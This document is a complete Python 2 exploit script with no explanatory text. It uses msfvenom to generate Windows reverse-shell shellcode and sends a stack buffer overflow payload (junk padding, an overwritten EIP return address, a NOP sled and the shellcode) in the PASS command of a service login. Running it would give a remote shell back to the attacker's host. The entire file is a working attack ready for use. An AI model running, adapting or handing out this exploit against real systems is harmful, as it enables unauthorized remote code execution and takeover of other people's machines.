import socket
import struct
import sys
import os
import subprocess
from time import sleep
if len(sys.argv) < 5:
    print "[*] Usage: {} <rhost> <rport> <lhost> <lport>".format(sys.argv[0])
    exit()

RHOST=sys.argv[1]
RPORT=sys.argv[2]
LHOST=sys.argv[3]
LPORT=sys.argv[4]


print '[*] Generating shellcode...'
msfvenom_str = 'msfvenom -a x86 -p windows/shell_reverse_tcp LHOST={} LPORT={} -b "\\x00\\x0a\\x0d" -f python -v shellcode -o sc.py'.format(LHOST,LPORT)

p = subprocess.Popen(msfvenom_str.split(" "),stdout=subprocess.PIPE,stderr=subprocess.PIPE)
out,err = p.communicate()

try:
    from sc import shellcode
    print '[+] Shellcode generated... Running exploit'
except:
    print '[-] Shellcode was not generated...'
    exit()

sleep(3)
os.remove("sc.py")
os.remove("sc.pyc")

junk = "A"*4654
eip = struct.pack("I",0x5F4A358F)
nops = "\x90"*32

buf = junk + eip + nops + shellcode

try:
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((RHOST,int(RPORT)))
    s.recv(1024)
    s.send("USER username\r\n")
    s.recv(1024)
    s.send("PASS "+buf+"\r\n")
    s.close()

except:
    print "[-] Could not connect"
